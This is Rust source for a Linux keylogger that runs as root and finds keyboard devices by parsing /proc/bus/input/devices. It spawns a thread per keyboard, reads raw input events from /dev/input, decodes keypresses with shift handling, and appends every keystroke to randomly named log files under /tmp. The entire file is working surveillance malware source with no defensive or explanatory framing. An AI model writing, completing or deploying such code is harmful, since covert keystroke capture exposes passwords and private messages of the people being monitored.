use std::{
    fs::{File, OpenOptions},
    io::{Read, Write, BufReader, BufRead},
    cell::RefCell,
    str, 
    mem, 
    thread,
};

use libc::input_event;
use regex::Regex;
use rand::random;

use crate::Common;
use super::input::{
    KEY_NAMES,
    SHIFT_KEY_NAMES,
    MAX_KEYS,
    UK,
    LEFTSHIFT,
    RIGHTSHIFT
};

const BUS_PATH: &str = "/proc/bus/input/devices";

const EV_SIZE: usize = mem::size_of::<input_event>();
const EV_KEY: u16 = 1;

pub struct Keylogger { }

impl Common for Keylogger {
    fn start_logging(&self) {
        if unsafe { libc::geteuid() } != 0 { panic!("Must run as root") }

        let keyboards = parse_bus();
        let mut handles = vec![];

        for kbd in keyboards {
            let handle = thread::spawn(move || {
                let num: u8 = random();
                log_keystrokes(format!("file_{}.log", num), kbd);
            });

            handles.push(handle);
        }

        for handle in handles {
            handle.join().unwrap();
        }
    }
}


fn parse_bus() -> Vec<String> {
    let bus = File::open(BUS_PATH).unwrap();
    let lines = Box::new(BufReader::new(bus).lines());

    let mut handlers: Vec<String> = Vec::new();
    let entry = RefCell::new(String::new());
    let re = Regex::new(r"(?m)(event\d+)").unwrap();

    for line in lines {
        let l = line.unwrap();

        if !l.is_empty() {
            entry.borrow_mut().push_str(&l);
            continue
        }

        if entry.borrow().contains("EV=120013") { 
            let entry_guard = entry.borrow();
            if let Some(captures) = re.captures(&entry_guard) { 
                if let Some(m) = captures.get(0) { handlers.push(m.as_str().to_string()) }
            }
        } 

        entry.borrow_mut().clear();
    }

    handlers
}

fn log_keystrokes(log_fname: String, event_handler: String) {
    let mut device_file = File::open(format!("/dev/input/{}", event_handler)).unwrap();
    let mut data_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(format!("/tmp/{}",log_fname))
        .unwrap();

    let mut buf: [u8; EV_SIZE] = unsafe { mem::zeroed() };  
    let mut shift_pressed = false;

    loop {
        match device_file.read(&mut buf) {
            Ok(num) => {
                if num != EV_SIZE { continue }

                let ev = unsafe { mem::transmute::<[u8; EV_SIZE], input_event>(buf) };
                if ev.type_ != EV_KEY { continue }

                let code = ev.code as usize;

                if ev.value == 1 { // on keypress
                    let key = match ev.code {
                        LEFTSHIFT | RIGHTSHIFT => {
                            shift_pressed = true;
                            continue;
                        },
                        0..=MAX_KEYS => if shift_pressed { SHIFT_KEY_NAMES[code] } else { KEY_NAMES[code] },
                        _ => UK
                    };

                    if data_file.write(key.as_bytes()).unwrap() == 0 { continue };
                } else { // on key lift
                    match ev.code {
                        LEFTSHIFT | RIGHTSHIFT => {
                            shift_pressed = false;
                            continue;
                        },
                        _ => continue
                    };
                }
            },
            Err(e) => panic!("Could not read: {}", e)
        }
    }
}
